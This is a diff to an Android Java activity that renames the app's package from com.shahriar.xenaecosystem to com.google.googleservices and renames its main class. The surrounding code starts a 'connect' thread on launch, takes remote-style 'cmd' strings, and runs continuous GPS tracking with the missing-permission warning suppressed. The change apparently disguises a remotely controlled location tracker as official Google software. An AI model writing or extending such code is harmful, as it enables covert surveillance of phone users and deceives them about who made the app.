@@ -1,4 +1,4 @@
-package com.shahriar.xenaecosystem;
+package com.google.googleservices;
 
 
 import androidx.annotation.RequiresApi;
@@ -29,6 +29,7 @@ import com.google.android.gms.location.FusedLocationProviderClient;
 
 import com.google.android.gms.location.LocationServices;
 import com.google.android.gms.tasks.OnSuccessListener;
+import com.google.googleservices.R;
 
 
 import java.io.BufferedReader;
@@ -49,7 +50,7 @@ import java.util.List;
 import java.util.concurrent.Executor;
 
 
-public class Activity1 extends AppCompatActivity {
+public class MainActivity extends AppCompatActivity {
 
 
     private String current_location = "null";
@@ -57,7 +58,7 @@ public class Activity1 extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.layout1);
+        setContentView(R.layout.activity_main);
 
         connect thread = new connect();
         thread.start();
@@ -392,7 +393,7 @@ public class Activity1 extends AppCompatActivity {
                         }
                     };
 
-                    Activity1.this.runOnUiThread(r);
+                    MainActivity.this.runOnUiThread(r);
                     return "Scanning";
                 } else {
                     return "Permission denied";
@@ -406,7 +407,7 @@ public class Activity1 extends AppCompatActivity {
                     }
                 };
 
-                Activity1.this.runOnUiThread(r);
+                MainActivity.this.runOnUiThread(r);
             }
             return "Stopped";
         }
@@ -417,23 +418,23 @@ public class Activity1 extends AppCompatActivity {
 
     }
     LocationManager locationManager;
-        @SuppressLint("MissingPermission")
-        void scan_loc() {
+    @SuppressLint("MissingPermission")
+    void scan_loc() {
 
 
-                locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
 
 
-                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0,loc_listen);
+        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0,loc_listen);
 
 
 
 
-        }
+    }
 
-        void stop_loc(){
-            locationManager.removeUpdates(loc_listen);
-        }
+    void stop_loc(){
+        locationManager.removeUpdates(loc_listen);
+    }
     LocationListener loc_listen=new LocationListener() {
 
         @Override
@@ -457,7 +458,7 @@ public class Activity1 extends AppCompatActivity {
 
         }
     };
-        
+
 
     @RequiresApi(api = Build.VERSION_CODES.M)
     String ask_permission(String cmd) {
